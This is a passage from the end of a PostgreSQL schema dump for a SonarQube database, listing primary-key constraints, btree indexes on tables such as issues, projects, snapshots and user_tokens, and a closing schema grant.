-- Name: rules rules_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules
    ADD CONSTRAINT rules_pkey PRIMARY KEY (id);


--
-- Name: rules_profiles rules_profiles_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules_profiles
    ADD CONSTRAINT rules_profiles_pkey PRIMARY KEY (id);


--
-- Name: snapshots snapshots_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY snapshots
    ADD CONSTRAINT snapshots_pkey PRIMARY KEY (id);


--
-- Name: user_roles user_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY user_roles
    ADD CONSTRAINT user_roles_pkey PRIMARY KEY (id);


--
-- Name: user_tokens user_tokens_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY user_tokens
    ADD CONSTRAINT user_tokens_pkey PRIMARY KEY (id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: widget_properties widget_properties_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY widget_properties
    ADD CONSTRAINT widget_properties_pkey PRIMARY KEY (id);


--
-- Name: widgets widgets_pkey; Type: CONSTRAINT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY widgets
    ADD CONSTRAINT widgets_pkey PRIMARY KEY (id);


--
-- Name: GROUPS_USERS_UNIQUE; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX "GROUPS_USERS_UNIQUE" ON groups_users USING btree (group_id, user_id);


--
-- Name: active_dashboards_dashboardid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX active_dashboards_dashboardid ON active_dashboards USING btree (dashboard_id);


--
-- Name: active_dashboards_userid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX active_dashboards_userid ON active_dashboards USING btree (user_id);


--
-- Name: activities_log_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX activities_log_key ON activities USING btree (log_key);


--
-- Name: ce_activity_component_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX ce_activity_component_uuid ON ce_activity USING btree (component_uuid);


--
-- Name: ce_activity_islast_status; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX ce_activity_islast_status ON ce_activity USING btree (is_last, status);


--
-- Name: ce_activity_islastkey; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX ce_activity_islastkey ON ce_activity USING btree (is_last_key);


--
-- Name: ce_activity_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX ce_activity_uuid ON ce_activity USING btree (uuid);


--
-- Name: ce_queue_component_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX ce_queue_component_uuid ON ce_queue USING btree (component_uuid);


--
-- Name: ce_queue_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX ce_queue_uuid ON ce_queue USING btree (uuid);


--
-- Name: duplications_index_hash; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX duplications_index_hash ON duplications_index USING btree (hash);


--
-- Name: duplications_index_sid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX duplications_index_sid ON duplications_index USING btree (snapshot_id);


--
-- Name: events_component_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX events_component_uuid ON events USING btree (component_uuid);


--
-- Name: events_snapshot_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX events_snapshot_id ON events USING btree (snapshot_id);


--
-- Name: file_sources_project_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX file_sources_project_uuid ON file_sources USING btree (project_uuid);


--
-- Name: file_sources_updated_at; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX file_sources_updated_at ON file_sources USING btree (updated_at);


--
-- Name: file_sources_uuid_type; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX file_sources_uuid_type ON file_sources USING btree (file_uuid, data_type);


--
-- Name: group_roles_resource; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX group_roles_resource ON group_roles USING btree (resource_id);


--
-- Name: index_groups_users_on_group_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX index_groups_users_on_group_id ON groups_users USING btree (group_id);


--
-- Name: index_groups_users_on_user_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX index_groups_users_on_user_id ON groups_users USING btree (user_id);


--
-- Name: issue_changes_issue_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issue_changes_issue_key ON issue_changes USING btree (issue_key);


--
-- Name: issue_changes_kee; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issue_changes_kee ON issue_changes USING btree (kee);


--
-- Name: issue_filter_favs_user; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issue_filter_favs_user ON issue_filter_favourites USING btree (user_login);


--
-- Name: issue_filters_name; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issue_filters_name ON issue_filters USING btree (name);


--
-- Name: issues_assignee; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_assignee ON issues USING btree (assignee);


--
-- Name: issues_component_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_component_uuid ON issues USING btree (component_uuid);


--
-- Name: issues_creation_date; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_creation_date ON issues USING btree (issue_creation_date);


--
-- Name: issues_kee; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX issues_kee ON issues USING btree (kee);


--
-- Name: issues_project_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_project_uuid ON issues USING btree (project_uuid);


--
-- Name: issues_resolution; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_resolution ON issues USING btree (resolution);


--
-- Name: issues_rule_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_rule_id ON issues USING btree (rule_id);


--
-- Name: issues_updated_at; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX issues_updated_at ON issues USING btree (updated_at);


--
-- Name: manual_measures_component_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX manual_measures_component_uuid ON manual_measures USING btree (component_uuid);


--
-- Name: measure_filter_favs_userid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX measure_filter_favs_userid ON measure_filter_favourites USING btree (user_id);


--
-- Name: measure_filters_name; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX measure_filters_name ON measure_filters USING btree (name);


--
-- Name: measures_person; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX measures_person ON project_measures USING btree (person_id);


--
-- Name: measures_sid_metric; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX measures_sid_metric ON project_measures USING btree (snapshot_id, metric_id);


--
-- Name: metrics_unique_name; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX metrics_unique_name ON metrics USING btree (name);


--
-- Name: projects_kee; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX projects_kee ON projects USING btree (kee);


--
-- Name: projects_module_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX projects_module_uuid ON projects USING btree (module_uuid);


--
-- Name: projects_project_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX projects_project_uuid ON projects USING btree (project_uuid);


--
-- Name: projects_qualifier; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX projects_qualifier ON projects USING btree (qualifier);


--
-- Name: projects_root_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX projects_root_id ON projects USING btree (root_id);


--
-- Name: projects_uuid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX projects_uuid ON projects USING btree (uuid);


--
-- Name: properties_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX properties_key ON properties USING btree (prop_key);


--
-- Name: resource_index_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX resource_index_key ON resource_index USING btree (kee);


--
-- Name: resource_index_rid; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX resource_index_rid ON resource_index USING btree (resource_id);


--
-- Name: rules_parameters_rule_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX rules_parameters_rule_id ON rules_parameters USING btree (rule_id);


--
-- Name: rules_repo_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX rules_repo_key ON rules USING btree (plugin_rule_key, plugin_name);


--
-- Name: snapshot_project_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX snapshot_project_id ON snapshots USING btree (project_id);


--
-- Name: snapshots_parent; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX snapshots_parent ON snapshots USING btree (parent_snapshot_id);


--
-- Name: snapshots_qualifier; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX snapshots_qualifier ON snapshots USING btree (qualifier);


--
-- Name: snapshots_root; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX snapshots_root ON snapshots USING btree (root_snapshot_id);


--
-- Name: snapshots_root_project_id; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX snapshots_root_project_id ON snapshots USING btree (root_project_id);


--
-- Name: uniq_author_logins; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_author_logins ON authors USING btree (login);


--
-- Name: uniq_group_roles; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_group_roles ON group_roles USING btree (group_id, resource_id, role);


--
-- Name: uniq_profile_rule_ids; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_profile_rule_ids ON active_rules USING btree (profile_id, rule_id);


--
-- Name: uniq_project_qprofiles; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_project_qprofiles ON project_qprofiles USING btree (project_uuid, profile_key);


--
-- Name: uniq_qprof_key; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_qprof_key ON rules_profiles USING btree (kee);


--
-- Name: uniq_quality_gates; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX uniq_quality_gates ON quality_gates USING btree (name);


--
-- Name: unique_schema_migrations; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX unique_schema_migrations ON schema_migrations USING btree (version);


--
-- Name: user_roles_resource; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX user_roles_resource ON user_roles USING btree (resource_id);


--
-- Name: user_roles_user; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX user_roles_user ON user_roles USING btree (user_id);


--
-- Name: user_tokens_login_name; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX user_tokens_login_name ON user_tokens USING btree (login, name);


--
-- Name: user_tokens_token_hash; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX user_tokens_token_hash ON user_tokens USING btree (token_hash);


--
-- Name: users_login; Type: INDEX; Schema: public; Owner: sonar
--

CREATE UNIQUE INDEX users_login ON users USING btree (login);


--
-- Name: users_updated_at; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX users_updated_at ON users USING btree (updated_at);


--
-- Name: widget_properties_widgets; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX widget_properties_widgets ON widget_properties USING btree (widget_id);


--
-- Name: widgets_dashboards; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX widgets_dashboards ON widgets USING btree (dashboard_id);


--
-- Name: widgets_widgetkey; Type: INDEX; Schema: public; Owner: sonar
--

CREATE INDEX widgets_widgetkey ON widgets USING btree (widget_key);


--
-- Name: public; Type: ACL; Schema: -; Owner: vcap
--

GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- PostgreSQL database dump complete
--


